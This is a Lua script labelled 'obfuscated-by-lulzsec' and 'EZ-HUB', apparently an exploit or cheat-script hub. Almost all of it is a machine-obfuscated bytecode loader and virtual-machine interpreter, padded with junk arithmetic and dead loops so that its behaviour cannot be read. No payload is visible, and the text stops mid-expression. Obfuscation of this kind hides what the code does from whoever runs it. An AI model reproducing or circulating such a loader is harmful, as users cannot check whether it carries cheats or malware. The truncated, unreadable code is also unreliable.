--obfuscated-by-lulzsec-
--API--SYSTEM--CREDITS-EZ-HUB


--
print("TEST")


do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (3==v0) then v10=setmetatable;v11=pcall;v12=select;v0=4;end if (v0==2) then v7=table.concat;v8=table.insert;v9=getfenv or function()return _ENV;end;v0=3;end if (v0==1) then v4=string.sub;v5=string.gsub;v6=string.rep;v0=2;end if (v0==5) then function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v64=v3(v1(v30,16));if v19 then local v67=v6(v64,v19);v19=nil;return v67;else return v64;end end end);local function v20(v31,v32,v33)if v33 then local v65=(v31/((601 -(45 + 84 + (1313 -843)))^(v32-(1 -0))))%((5 -3)^(((v33-(1 + 0)) -(v32-(1 + 0))) + ((3 -1) -1)));return v65-(v65%(1 + 0));else local v66=(5 -3)^(v32-(1 + (667 -(473 + 194))));return (((v31%(v66 + v66))>=v66) and (1543 -(296 + 1246))) or (0 -0);end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39=0;local v40;local v41;while true do if (v39==(1800 -((1448 -(224 + 852)) + 1428))) then v40,v41=v2(v16,v18,v18 + (272 -(44 + 226)));v18=v18 + (1621 -(231 + 1388));v39=1 + 0;end if (v39==(1 + 0)) then return (v41 * (1580 -(263 + 1061))) + v40;end end end local function v23()local v42,v43,v44,v45=v2(v16,v18,v18 + (622 -(90 + (2015 -(822 + 664)))));v18=v18 + (7 -3);return (v45 * (2571268 + 14205948)) + (v44 * (41594 + 23942)) + (v43 * (420 -164)) + v42;end local function v24()local v46=(0 -0) + 0;local v47;local v48;while true do if (1==v46) then return (( -(5 -3) * v20(v48,12 + 20)) + 1 + 0) * ((300 -(77 + 221))^(v20(v48,10 + 11,93 -62) -(1649 -626))) * ((((v20(v48,2 -1,912 -(801 + 91)) * (((2389 -(43 + 840)) -(935 + (2450 -1881)))^32)) + v47)/((199 -(135 + 62))^52)) + 1 + 0);end if (v46==(1353 -(416 + 937))) then v47=v23();v48=v23();v46=1;end end end local function v25(v34)local v49=428 -(114 + 73 + (1716 -(40 + 1435)));local v50;local v51;while true do if (v49==(1830 -(279 + 1548))) then return v7(v51);end if ((2 -1)==v49) then v50=v4(v16,v18,(v18 + v34) -((2 -1) -0));v18=v18 + v34;v49=1 + (2 -1);end if (v49==2) then v51={};for v68=1 + 0, #v50 do v51[v68]=v3(v2(v4(v50,v68,v68)));end v49=(1293 -(517 + 531)) -(9 + 233);end if ((1023 -(59 + 964))==v49) then v50=nil;if  not v34 then local v70=0 + 0;while true do if (v70==(1062 -(562 + 500))) then v34=v23();if (v34==0) then return "";end break;end end end v49=298 -(138 + 28 + 131);end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0;local v53;local v54;local v55;local v56;local v57;local v58;while true do local v63=0 -0;while true do if (v63==1) then if ((1 -0)==v52) then v57=v23();v58={};for v80=1572 -(1550 + 21),v57 do local v81=0;local v82;local v83;local v84;while true do if (0==v81) then v82=0 + 0;v83=nil;v81=1732 -(1176 + 555);end if (v81==(1 -0)) then v84=nil;while true do if (v82~=(1 + 0)) then else if (v83==(1 -0)) then v84=v21()~=(0 + 0);elseif (v83==(2 + 0)) then v84=v24();elseif (v83==(1456 -(951 + 502))) then v84=v25();end v58[v80]=v84;break;end if (v82==(0 -0)) then local v109=672 -(241 + 431);local v110;while true do if (v109==(0 + 0)) then v110=129 -(81 + 48);while true do if (v110~=1) then else v82=307 -(192 + 114);break;end if (v110==(0 -0)) then local v119=1959 -(1530 + 429);while true do if (v119==(0 + 0)) then v83=v21();v84=nil;v119=1;end if (v119~=(587 -(94 + 492))) then else v110=1;break;end end end end break;end end end end break;end end end v56[5 -2]=v21();v52=9 -7;end break;end if (v63~=(0 -0)) then else if (v52==(1755 -(300 + 1455))) then local v78=319 -(237 + 82);while true do if (v78==(512 -(509 + 3))) then v53={};v54={};v78=1 + 0;end if (v78==(255 -(76 + 178))) then v55={};v56={v53,v54,nil,v55};v78=9 -7;end if (v78==(1 + 1)) then v52=2 -1;break;end end end if (v52==2) then local v79=571 -(249 + 322);while true do if (v79==(0 -0)) then for v85=1853 -(596 + 1256),v23() do local v86=0;local v87;local v88;while true do if (v86~=1) then else while true do if (v87~=(1369 -(1037 + 332))) then else v88=v21();if (v20(v88,1 -0,1)~=0) then else local v114=0 + 0;local v115;local v116;local v117;local v118;while true do if ((0 + 0)==v114) then local v120=693 -(614 + 79);while true do if ((0 -0)~=v120) then else v115=1944 -(1751 + 193);v116=nil;v120=1008 -(517 + 490);end if (v120~=(650 -(318 + 331))) then else v114=922 -(41 + 880);break;end end end if (v114==(1315 -(1003 + 310))) then while true do if (0~=v115) then else local v122=0;local v123;while true do if (v122==0) then v123=0;while true do if (v123~=0) then else local v217=0;local v218;while true do if (v217==0) then v218=0 -0;while true do if (v218==(364 -(191 + 173))) then v116=v20(v88,2,13 -10);v117=v20(v88,8 -4,5 + 1);v218=1 -0;end if (v218==(2 -1)) then v123=1 + 0;break;end end break;end end end if ((319 -(51 + 267))~=v123) then else v115=1395 -(363 + 1031);break;end end break;end end end if (v115==(1 + 1)) then local v124=0 -0;local v125;while true do if (v124~=(0 -0)) then else v125=1434 -(535 + 899);while true do if (v125~=(0 -0)) then else local v219=0;while true do if (v219==(881 -(134 + 747))) then if (v20(v117,1870 -(1621 + 248),1 -0)==(94 -(10 + 83))) then v118[1438 -(375 + 1061)]=v58[v118[1 + 1]];end if (v20(v117,6 -4,2)~=(1504 -(5 + 1498))) then else v118[1214 -(926 + 285)]=v58[v118[3]];end v219=1 + 0;end if (v219==(3 -2)) then v125=1 + 0;break;end end end if (v125==(1 + 0)) then v115=3;break;end end break;end end end if ((12 -9)==v115) then if (v20(v117,3,9 -6)==(1711 -(324 + 1386))) then v118[13 -9]=v58[v118[4 + 0]];end v53[v85]=v118;break;end if (v115==1) then local v127=0 -0;while true do if (v127~=(0 -0)) then else local v129=0 -0;while true do if (v129~=(1 + 0)) then else v127=1 -0;break;end if (v129==0) then v118={v22(),v22(),nil,nil};if (v116==0) then local v225=0 + 0;local v226;while true do if (v225~=0) then else v226=0 -0;while true do if (v226==(0 -0)) then v118[3]=v22();v118[4]=v22();break;end end break;end end elseif (v116==(1412 -(990 + 421))) then v118[3]=v23();elseif (v116==(111 -(76 + 33))) then v118[556 -(38 + 515)]=v23() -((480 -(218 + 260))^(5 + 11));elseif (v116==(3 + 0)) then local v275=0 -0;local v276;local v277;while true do if (v275==(413 -(170 + 242))) then while true do if (v276==(345 -(299 + 46))) then v277=0 -0;while true do if ((0 -0)==v277) then v118[2 + 1]=v23() -((1 + 1)^16);v118[3 + 1]=v22();break;end end break;end end break;end if (v275==(1316 -(432 + 884))) then v276=0 + 0;v277=nil;v275=739 -(509 + 229);end end end v129=1 -0;end end end if (v127~=(2 -1)) then else v115=686 -(202 + 482);break;end end end end break;end if (v114~=1) then else local v121=1068 -(169 + 899);while true do if ((550 -(130 + 419))~=v121) then else v114=6 -4;break;end if (v121==0) then v117=nil;v118=nil;v121=1 + 0;end end end end end break;end end break;end if (v86==(0 + 0)) then v87=0;v88=nil;v86=1 + 0;end end end for v89=3 -2,v23() do v54[v89-(1171 -(33 + 1137))]=v28();end v79=1793 -(925 + 867);end if (v79==1) then for v91=1 + 0,v23() do v55[v91]=v23();end return v56;end end end v63=2 -1;end end end end local function v29(v35,v36,v37)local v59=0;local v60;local v61;local v62;while true do if (v59==1) then v62=v35[3];return function(...)local v71=0;local v72;local v73;local v74;local v75;local v76;while true do if (v71==2) then v76=nil;function v76()local v93=v60;local v94=Const;local v95=v61;local v96=v62;local v97=v27;local v98={};local v99={};local v100={};for v105=0,v75 do if (((267 + 933)>=(4625 -(7463 -3939))) and (v105>=v96)) then v98[v105-v96]=v74[v105 + 1 + 0];else v100[v105]=v74[v105 + (1 -0)];end end local v101=(v75-v96) + 1 + 0;local v102;local v103;while true do local v106=(1082 -(429 + 653)) + 0;local v107;while true do if (((3317 -(944 + 609))<(5107 -(245 + 41))) and (v106==(841 -(724 + 117)))) then v107=0;while true do if ((v107==(0 -0)) or ((759 + 273)<((4374 -2089) -1600))) then local v113=0 -0;while true do if ((v113==(0 + 0)) or ((1216 -(156 + 926))>(2212 + 1732))) then v102=v93[v72];v103=v102[1];v113=1 + 0;end if ((v113==1) or (((4873 -(445 + 1220)) -(239 + 271))>=(2594 + 1171))) then v107=1;break;end end end if ((v107==(158 -(15 + 142))) or ((1263 -589)>=(3142 -(817 + 677)))) then if ((4835>=((6301 -(1102 + 37)) -1225)) and (v103<=(1865 -(1610 + 236)))) then if ((v103<=((1547 -(701 + 776)) -(9 + 52))) or (165>(3674 -1560))) then if (((987 -(373 + 195))<(2055 -(124 + 70))) and (v103<=(9 -5))) then if (((2100 + 826)<=4373) and (v103<=(2 -(1 + 0)))) then if (((984 -421)<=(3901 + 193)) and (v103==0)) then local v130=1051 -(864 + 187);local v131;local v132;local v133;while true do if ((v130==(0 + 0)) or ((600 + 4146)<(5466 -((2108 -(302 + 994)) + 292)))) then v131=1454 -(674 + 780);v132=nil;v130=1 + 0;end if ((v130==(1 + 0)) or ((607 + 23)==(1776 -(320 + 824)))) then v133=nil;while true do if (((2122 + (1864 -(72 + 778)))>=2559) and (1==v131)) then while true do if ((v132==(0 + 0)) or ((776 + 1875)>=2741)) then v133=v102[87 -(12 + 73)];do return v13(v100,v133,v133 + v102[3]);end break;end end break;end if (((0 -0)==v131) or ((5910 -2395)==(8967 -4541))) then local v230=0 + 0;while true do if ((2452<2599) and (v230==(417 -(9 + 407)))) then v131=1 + 0;break;end if ((1289<=(5993 -(417 + 1570))) and ((0 -0)==v230)) then v132=1945 -(720 + 1225);v133=nil;v230=1 + 0;end end end end break;end end elseif ((v100[v102[1 + 1]]==v102[5 -1]) or ((1848 + 142)<=(472 -92))) then v72=v72 + 1 + 0;else v72=v102[3];end elseif ((v103<=2) or ((2204 -1759)>(5616 -(1368 + 464)))) then v100[v102[2 + (0 -0)]]= -v100[v102[9 -6]];elseif ((v103>(972 -(708 + 261))) or ((9431 -7403)==(5072 -(1473 + 399)))) then v100[v102[2]]=v100[v102[6 -(6 -3)]][v102[16 -12]];else v100[v102[2 + 0]]=v102[3]~=(0 -0);end elseif ((v103<=6) or ((9278 -6432)==3475)) then if (((781 + 606)>(1515 -680)) and (v103==(1048 -(559 + 484)))) then local v135=0;local v136;local v137;local v138;while true do if ((v135==(0 + 0)) or ((2386 + 605)<(25 + 1881))) then v136=v102[2 + 0];v137={v100[v136](v13(v100,v136 + (1 -0),v73))};v135=1 -0;end if ((v135==(1 + 0)) or ((2402 -734)>=((7008 -(376 + 266)) -3409))) then v138=0 -0;for v221=v136,v102[4] do local v222=0 -0;local v223;local v224;while true do if (((3427 -(56 + (1570 -282)))>=((678 -(426 + 219)) + 34)) and (v222==(1 + 0))) then while true do if ((v223==(0 -(0 -0))) or (4326<=(18 + 114))) then v224=0 -0;while true do if ((v224==(0 -0)) or ((608 + 107 + 41)==(2258 -(14 + 33)))) then v138=v138 + (2 -1);v100[v221]=v137[v138];break;end end break;end end break;end if ((v222==0) or ((1182 -(237 + 68))>=(5016 -(852 + 476)))) then v223=0 -0;v224=nil;v222=2 -1;end end end break;end end else v100[v102[2]]=v37[v102[1386 -(1051 + 332)]];end elseif (((86 + 1464)==((2948 -(1329 + 648)) + 579)) and (v103<=(12 -5))) then local v140=27 -((1151 -(375 + 757)) + 3 + 5);local v141;local v142;while true do if (((5444 -2521)>=(7565 -5601)) and (v140==((0 -0) -0))) then v141=0;v142=nil;v140=1;end if (((1326 + 92)<4776) and (v140==1)) then while true do if ((v141==(1069 -(161 + 154 + 754))) or ((399 + 1214)>2488)) then v142=v102[3 -1];v100[v142]=v100[v142]();break;end end break;end end elseif ((v103==(1216 -(918 + 290))) or ((3589 -(3552 -(750 + 564)))==(2786 -(1444 + 398)))) then local v190=0;local v191;local v192;local v193;local v194;local v195;local v196;local v197;while true do if (((2532 -1045)<=(843 + 848)) and (v190==(1 -0))) then v193=nil;v194=nil;v190=2;end if ((((1206 -(1182 + 24)) -0)==v190) or ((4377 -(461 + 660))<79)) then v191=(98 + 133) -(221 + 10);v192=nil;v190=1 + 0;end if ((v190==2) or ((31 + 1322)>2453)) then v195=nil;v196=nil;v190=954 -(663 + 288);end if (((2451 + 75)>=464) and (v190==(9 -6))) then v197=nil;while true do if ((3674==3674) and (v191==(534 -(313 + 220)))) then v194=nil;v195=nil;v191=2;end if ((v191==(0 -0)) or ((1472 + 2629)==(3158 -1938))) then local v256=0 + 0;while true do if ((v256==(0 + 0)) or ((75 + 64)==(808 -418))) then v192=0;v193=nil;v256=1;end if ((v256==(1 -0)) or ((352 + 366)>727)) then v191=2 -1;break;end end end if (((322 + 1527)<=4198) and (v191==3)) then while true do if ((v192==(1676 -(1354 + 320))) or ((1284 -921)==(4626 -2220))) then local v278=0;local v279;while true do if ((v278==(0 + 0)) or ((336 + 47)>=(14035 -9492))) then v279=0;while true do if ((3694>1459) and (v279==((2 + 0) -1))) then v192=3;break;end if ((1611>=(2451 -930)) and (v279==(0 -0))) then local v298=0;while true do if (((8947 -7111)<4521) and (v298==0)) then for v322=1 -0,v194 do v100[v195 + v322]=v196[v322];end v197=v196[(2472 -(601 + 729)) -(1015 + 126)];v298=1198 -((2012 -1556) + 741);end if ((((2 -1) + 0)==v298) or ((153 + 4126)<=((5582 -(90 + 1730)) -2824))) then v279=1 -0;break;end end end end break;end end end if (((5951 -(639 + 738))>((573 + 321) -(477 + 143))) and (v192==1)) then local v280=0 -0;local v281;while true do if (((0 -0)==v280) or ((4027 + 431)>=(6585 -(1796 + (270 -126))))) then v281=1915 -(748 + 1167);while true do if ((((10120 -4631) -(161 + 1476))==((37328 -22020) -11456)) and (v281==(0 + 0))) then v195=v193 + ((3 + 2) -3);v196={v100[v193](v100[v193 + (843 -(763 + 79))],v100[v195])};v281=1513 -(631 + 881);end if ((v281==(2 -1)) or ((1247 -361)>(9686 -6453))) then v192=1466 -(1230 + 234);break;end end break;end end end if (((6581 -5043)<=(6798 -4348)) and (v192==(0 -0))) then local v282=0 -0;local v283;while true do if ((v282==(0 + 0)) or ((2157 -1026)==(14064 -9079))) then v283=1490 -(170 + 1320);while true do if (((11029 -7163)<=((6342 + 5982) -8152)) and (v283==(0 -0))) then local v299=0 -0;while true do if (((0 + 0)==v299) or ((1532 -614)>=(768 + 662 + 451))) then v193=v102[1286 -(163 + 1121)];v194=v102[1 + 3];v299=(1 -0) + 0;end if (((1737 -(1540 + 53))<=(2629 -(526 + 822))) and (v299==(568 -(390 + (1189 -(907 + 105)))))) then v283=1;break;end end end if ((3954>(1756 -(365 + 1192))) and (v283==(1967 -(1336 + 630)))) then v192=1 + 0;break;end end break;end end end if (((4240 -2553)>=(1852 -(128 + 155))) and (v192==(8 -5))) then if (((1748 + 2863)<=(4321 + (869 -(316 + 1)))) and v197) then local v289=0 + 0;local v290;local v291;while true do if ((4385>=2734) and ((248 -(196 + 52))==v289)) then v290=1429 -(1206 + 223);v291=nil;v289=1 + (0 -0);end if ((v289==((267 -(27 + 239)) + 0)) or ((7396 -5023)==(2207 -1360))) then while true do if ((3709>(4011 -(89 + 288))) and ((0 -0)==v290)) then v291=0 -0;while true do if ((0==v291) or (163>=(15954 -(1518 + 9743)))) then v100[v195]=v197;v72=v102[3];break;end end break;end end break;end end else v72=v72 + ((2 -0) -1);end break;end end break;end if ((v191==((660 + 299) -(762 + (1518 -(359 + 964))))) or ((80 -58)==((3832 + 1860) -(296 + 1531)))) then local v257=0 -0;while true do if ((0==v257) or ((6435 -1681)<(6646 -3742))) then v196=nil;v197=nil;v257=3 -2;end if ((1==v257) or ((1952 + 2470)<(774 + 2770))) then v191=3;break;end end end end break;end end else local v198=0 + 0;local v199;while true do if (((1367 -(32 + 538))<((37 + 5921) -4735)) and ((0 + 0)==v198)) then v199=v102[888 -(817 + 69)];v100[v199]=v100[v199](v13(v100,v199 + (4 -3),v73));break;end end end elseif ((v103<=(28 -(4 + 10))) or ((890 + 722)==2043)) then if ((v103<=(23 -12)) or (1637>2066)) then if (((1532 + 3 + 530)==(3393 -(1055 + 273))) and (v103>(73 -(14 + 49)))) then local v143=175 -(58 + 117);local v144;local v145;while true do if ((4956>(1316 + 654)) and (v143==(1527 -(782 + 744)))) then while true do if (((320 + 805)<4495) and (v144==(1351 -(1012 + 339)))) then v145=v102[2];v100[v145]=v100[v145](v100[v145 + (1049 -(136 + 912))]);break;end end break;end if ((4652>(8222 -5608)) and (v143==((0 -0) -0))) then v144=368 -(106 + 262);v145=nil;v143=1154 -(917 + (306 -70));end end else v100[v102[(7 + 0) -(1300 -(874 + 421))]]();end elseif ((((745 + 2770) -(117 + 1000))>(4770 -2528)) and (v103<=(4 + 8))) then local v146=0 + 0;local v147;local v148;local v149;while true do if ((v146==(0 -0)) or ((1238 + 193)<(1054 -632))) then v147=0 + 0;v148=nil;v146=1;end if (((1933 -(167 + 127 + 234))>1187) and (v146==((6 -3) -2))) then v149=nil;while true do if ((v147==(0 + 0 + 0)) or ((374 + 1178)<(1633 -(665 + 418)))) then v148=0 -0;v149=nil;v147=1 + 0;end if (((1635 + 2916)>=(1180 -(154 + 119))) and (v147==(2 -1))) then while true do if ((v148==(1305 -(1053 + 252))) or ((586 -234)>=(5297 -(420 + 1165)))) then v149=v102[1409 -(411 + 996)];v100[v149](v100[v149 + (164 -(111 + 52))]);break;end end break;end end break;end end elseif ((v103>(338 -(194 + 131))) or ((1632 + 3090)<(1056 -476))) then v100[v102[407 -(165 + 240)]]=v36[v102[3]];else local v201=1327 -(359 + 968);local v202;while true do if (((16604 -13274)>(1404 -((1812 -(1219 + 588)) + 268))) and (v201==(0 + 0))) then v202=v102[2];do return v13(v100,v202,v73);end break;end end end elseif ((v103<=16) or ((4009 -2421)<=1435)) then if ((v103>(492 -(382 + 95))) or ((4551 -(272 + 424))<=((7417 -(97 + 1885)) -1669))) then if ((((40 + 2932) -(579 + 29))<=(448 + 2517)) and (v102[1781 -(1766 + (1553 -(1072 + 468)))]==v100[v102[10 -6]])) then v72=v72 + 1 + 0;else v72=v102[8 -5];end else v37[v102[1364 -(1169 + 192)]]=v100[v102[1166 -(528 + 636)]];end elseif ((v103<=(14 + 3)) or ((183 + 1540)>=(467 + (2640 -(205 + 342))))) then local v151=0 + 0;local v152;local v153;local v154;while true do if (((4194 -1391)>=(9445 -6988)) and (v151==((1144 -504) -(422 + 217)))) then v154=nil;while true do if ((v152==(1 + 0)) or ((5491 -(332 + 176))<=((13174 -8870) -(7 + 40)))) then while true do if ((v153==(0 + 0 + 0)) or (((3095 -(388 + 1088)) -584)>(2608 -(34 + 326)))) then v154=v102[(1 -0) + 1];v100[v154](v13(v100,v154 + (2 -1) + 0,v102[1 + 2]));break;end end break;end if (((3107 -(186 + (964 -256)))<=(1887 + 1405)) and (v152==((0 -0) -0))) then local v233=0 -(213 -(172 + 41));while true do if ((((10828 -7702) -(1347 + 439))<(621 + 1145)) and (v233==(1929 -(41 + 65 + 1823)))) then v153=0;v154=nil;v233=1;end if ((4427==(7989 -3562)) and (v233==(899 -(17 + 881)))) then v152=1174 -(216 + 957);break;end end end end break;end if ((8==(721 -(192 + 521))) and ((0 + 0)==v151)) then v152=0 -0;v153=nil;v151=1 + 0;end end elseif ((v103==(35 -(44 -27))) or ((2212 -(503 + 1334))>=(204 + 457))) then local v203=0 -0;local v204;local v205;while true do if ((v203==0) or ((2528 + 968)>(18361 -14316))) then v204=0 -0;v205=nil;v203=2 -1;end if (((1343 + 306)<2141) and (v203==(2 -1))) then while true do if (((3982 -(710 + 1010))<(8133 -4365)) and (v204==(0 -(663 -(423 + 240))))) then v205=v102[1331 -(324 + 1005)];do return v100[v205](v13(v100,v205 + 1,v102[3]));end break;end end break;end end else do return;end end elseif (((10167 -6924)>(1707 -(166 + 1194))) and (v103<=(12 + 17))) then if ((v103<=(2 + 22)) or ((2322 -1585)>=(2579 -(43 + 55)))) then if ((v103<=(3 + 18)) or ((4953 -(822 + 383))>3896)) then if ((v103>20) or (4690>(12590 -7750))) then do return v100[v102[2 -0]];end else local v155=0 + 0;local v156;local v157;local v158;local v159;while true do if ((v155==1) or (((2409 + 173) -(851 + 1135))==(126 + 864))) then v158=nil;v159=nil;v155=2;end if (((371 + 2092 + 76 + 649)>=(2186 -(897 + 152))) and (v155==(619 -(594 + 23)))) then while true do if (((2414 + 40)<=3201) and (v156==(1 + 0))) then v159=nil;while true do if (((72 + 1006)<((66 -49) + 1776)) and (v157==1)) then v100[v158 + (1261 -(1081 + 179))]=v159;v100[v158]=v159[v102[18 -14]];break;end if ((v157==((0 -0) -0)) or (((17429 -7353) -6153)<(186 -75))) then local v262=0 + 0;local v263;while true do if (((5608 -((2188 -(236 + 488)) + 322))>(114 + 79)) and (v262==0)) then v263=0 -0;while true do if ((v263==1) or ((4846 -(1896 + 48))>=(9069 -4928))) then v157=1 + 0 + (0 -0);break;end if ((2900>=(284 -(1041 -(150 + 704)))) and (v263==(0 + 0))) then v158=v102[709 -(351 + 356)];v159=v100[v102[1729 -(394 + (2322 -(878 + 112)))]];v263=1818 -(1506 + 311);end end break;end end end end break;end if ((1228<(2340 -957)) and (0==v156)) then local v234=0 + 0;while true do if (((971 + 816)>(83 + 19)) and (v234==(1 + 0))) then v156=1 + 0;break;end if ((v234==(0 -0)) or (((16056 + 1415) -(14292 -(1152 + 192)))<=(368 -234))) then v157=(6289 -4906) -(721 + 662);v158=nil;v234=623 -(589 + 32 + 1);end end end end break;end if ((v155==(0 + 0)) or ((6662 -4653)>=(5840 -(847 + 281)))) then v156=0;v157=nil;v155=293 -(270 + 22);end end end elseif ((((4924 + 4431) -5024)>=(94 + 1722)) and (v103<=(16 + 6))) then v100[v102[2]][v102[11 -8]]=v100[v102[4]];elseif ((v103==(54 -31)) or ((266 + 435)>=2090)) then if (v100[v102[1245 -(714 + 529)]] or ((1476 -((1599 -1076) + 285))>=(1384 + 136))) then v72=v72 + (3 -2);else v72=v102[11 -8];end else v100[v102[2]][v102[1 + 2]]=v102[7 -3];end elseif ((v103<=(23 + 3)) or ((2277 -(510 + 461))>=((8019 -5735) -(21 + 13)))) then if (((4219 -(25 + 403))>(851 + 860)) and (v103==(58 -33))) then local v161=1942 -(750 + 1192);local v162;local v163;while true do if (((6001 -(1114 + 142))==(11256 -6511)) and (v161==(1081 -(313 + 768)))) then v162=0 -0;v163=nil;v161=(10 + 104) -(34 + 79);end if (((5628 -3133)==(4334 -(684 + 1155))) and (v161==((580 -(572 + 6)) -1))) then while true do if ((((1074 -573) + 1476)<=(1279 + 975)) and (v162==(0 + (903 -(439 + 464))))) then v163=v102[2 + 0];v100[v163](v13(v100,v163 + 1 + 0,v73));break;end end break;end end else local v164=0 + 0;local v165;local v166;local v167;local v168;local v169;while true do if (((95 + 506 + 1161)==(211 + (1815 -(114 + 150)))) and (v164==0)) then local v220=0 + 0;while true do if ((v220==(0 + 0)) or ((1037 + 15)>(520 + 2611))) then v165=654 -(17 + 637);v166=nil;v220=127 -(101 + 25);end if ((v220==1) or ((1861 -791)==(4813 -1506))) then v164=1576 -(972 + 603);break;end end end if ((v164==(1473 -(1173 + 299))) or ((1312 -(453 + 178))>=(1968 + 765))) then v167=nil;v168=nil;v164=1503 -((1240 -(152 + 5)) + 418);end if ((v164==(1158 -(178 + 387 + 591))) or (4822<=1051)) then v169=nil;while true do if (((1 + 0)==v165) or (4042<3803)) then local v235=0;local v236;while true do if ((4822<=4982) and (v235==0)) then v236=779 -(185 + 594);while true do if (((11278 -6870)<=(1563 + (5310 -2157))) and ((1 + 0)==v236)) then v165=2;break;end if ((4372>(4272 -(848 + 606))) and (v236==(0 -0))) then local v284=258 -(19 + 239);while true do if (((3747 -825)>(1934 -(6 + (1796 -(1166 + 465))))) and (v284==(900 -(326 + (2047 -(1338 + 136)))))) then v236=(2 -1) -(0 -0);break;end if ((v284==(0 + 0)) or ((764 -(10 + (295 -(269 + 18))))<=567)) then v73=(v168 + v166) -1;v169=0;v284=1 + 0;end end end end break;end end end if ((((7494 -2598) -(676 + 1190))>=(58 + 63)) and (v165==(0 + 0 + 0))) then local v237=0;local v238;while true do if (((3411 + 1168)==(4603 -(11 + 13))) and ((0 + 0)==v237)) then v238=0 -0;while true do if (((2507 + 924)>=3231) and (v238==(0 + 0))) then local v285=511 -(501 + 10);while true do if ((v285==(3 -(1 + 1))) or (2010>(8916 -(5422 -(160 + 445))))) then v238=1;break;end if (((690 -(189 + 392))<=(2913 -(339 + (2227 -(886 + 429))))) and (v285==0)) then v166=v102[1 + 1];v167,v168=v97(v100[v166](v100[v166 + (2 -1)]));v285=630 -((1449 -1033) + 213);end end end if (((5289 -(13269 -10021))<(7568 -5214)) and (((2 + 0) -1)==v238)) then v165=1 + 0;break;end end break;end end end if ((2==v165) or ((4888 -(492 + 1359))<=(7355 -4529))) then for v246=v166,v73 do local v247=0 + 0 + 0;local v248;while true do if (((2348 -(786 + (2418 -(947 + 734))))>544) and (v247==(971 -(529 + 442)))) then v248=666 -(330 + (683 -(278 + 69)));while true do if ((v248==(364 -(299 + 65))) or ((1646 -674)>3725)) then v169=v169 + (3 -2);v100[v246]=v167[v169];break;end end break;end end end break;end end break;end end end elseif ((v103<=(1739 -(1590 + 122))) or ((188 + 1600)==(831 + 2465))) then local v170=0 + 0;local v171;local v172;local v173;local v174;local v175;while true do if ((4651>=8) and (v170==(1185 -(546 + 637)))) then v175=nil;while true do if (((1065 + 956 + 1307)==(4177 -(825 + 24))) and (v171==(992 -(800 + 191)))) then v174=nil;v175=nil;v171=4 -2;end if ((v171==2) or (350==(3161 -1038))) then while true do if (((662 -382)<(675 -376)) and (v172==((7 + 0) -5))) then for v268=1,v102[10 -6] do local v269=0 -0;local v270;local v271;local v272;while true do if ((4026<=((9084 + 3755) -8286)) and (v269==(284 -((552 -300) + 31)))) then v272=nil;while true do if (((616 + (6577 -4499))>=(2556 -(402 + 430))) and (v270==(1930 -(1471 + 458)))) then while true do if (((623 + 2778)==(4016 -(426 + (362 -173)))) and (v271==(1742 -(565 + 1176)))) then if ((v272[1]==((5 -3) + 33)) or ((1680 -(816 + 452 + 247))<=(264 -164))) then v175[v268-(1889 -(1338 + 550))]={v100,v272[2 + 1]};else v175[v268-(1066 -((1475 -(728 + 149)) + (1962 -1495)))]={v36,v272[(3 -1) + 1]};end v99[ #v99 + (1544 -(104 + 1439))]=v175;break;end if ((v271==(0 -0)) or ((839 + 2335)<(47 + 227))) then local v307=0;while true do if (((4583 -3053)<=(3038 + 1624)) and (v307==(909 -(604 + 304)))) then v271=1 + 0;break;end if ((3307>(3604 -(1090 + 80))) and (v307==0)) then v72=v72 + (767 -(91 + 675));v272=v93[v72];v307=1934 -(1583 + 350);end end end end break;end if ((v270==(1323 -(599 + 542 + 182))) or ((13966 -9303)<(912 + 293))) then local v297=0 + 0;while true do if (((1766 + (609 -(19 + 548)))<(6007 -3989)) and (v297==(873 -(656 + 216)))) then v270=1 + 0;break;end if (((306 -(145 + 92))<((4570 -(356 + 930)) -(317 + 242))) and (v297==(0 -0))) then v271=0 -0;v272=nil;v297=1 + 0;end end end end break;end if ((3117>(87 + 46)) and (v269==(0 + 0))) then v270=0 + 0;v271=nil;v269=1206 -(663 + 542);end end end v100[v102[3 -1]]=v29(v173,v174,v37);break;end if ((2504>=1286) and (v172==(1 + 0))) then local v265=153 -(74 + 79);local v266;while true do if ((v265==0) or ((1901 + (3656 -(282 + 584)))<(663 + 534))) then v266=0 + 0;while true do if ((v266==1) or ((862 + 123)<(1578 -(307 + 619)))) then v172=867 -(688 + 177);break;end if (((9498 -4567)>(4096 -3028)) and (v266==0)) then local v296=0 -0;while true do if ((v296==(111 -(93 + 18))) or ((10623 -8021)==3959)) then v175={};v174=v10({},{__index=function(v308,v309)local v316=239 -(132 + 107);local v317;while true do if ((((3089 -(337 + 310)) -(831 + 499))>=578) and (v316==(664 -(147 + 517)))) then local v327=0 -(0 + 0);while true do if ((((2643 -1859) + 155)==(1966 -1027)) and ((0 + 0)==v327)) then v317=v175[v309];return v317[231 -(221 + 9)][v317[2 -0]];end end end end end,__newindex=function(v310,v311,v312)local v318=0;local v319;local v320;local v321;while true do if ((v318==((3077 -1779) -(805 + 492))) or (((1816 -1137) + 261)==(693 + 152))) then v321=nil;while true do if (((3671 -1732)==(1738 + 201)) and (0==v319)) then local v332=1140 -((2442 -1591) + 289);while true do if ((v332==((952 -(304 + 647)) + 0)) or ((564 + 1391)==(4151 -(416 + 766)))) then v319=1646 -(862 + 783);break;end if ((v332==0) or ((8916 -5862)<=(1524 -(510 + 808)))) then v320=0 -0;v321=nil;v332=1344 -(418 + 925);end end end if ((70<=(4589 -(4603 -(591 + 763)))) and (v319==1)) then while true do if ((((1372 -(54 + 21)) -(476 + 159))==662) and (v320==(281 -(114 + 167)))) then v321=v175[v311];v321[1 + 0][v321[2]]=v312;break;end end break;end end break;end if ((v318==(0 + 0)) or ((2258 + 1966)==(1768 -(68 + 50)))) then v319=0 + 0;v320=nil;v318=1 -0;end end end});v296=755 -(710 + 44);end if ((v296==(3 -2)) or ((1933 + 424)<=811)) then v266=107 -(33 + 73);break;end end end end break;end end end if ((v172==(0 + 0)) or ((1951 + 2028)==(659 + 967))) then local v267=0;while true do if (((1 + 0)==v267) or ((5526 -3123)<=1042)) then v172=1 + 0;break;end if (((574 + 1137)>((3109 -(76 + 1174)) -(86 + (276 -158)))) and (v267==0)) then local v286=0 + 0;while true do if ((v286==(0 + 0)) or 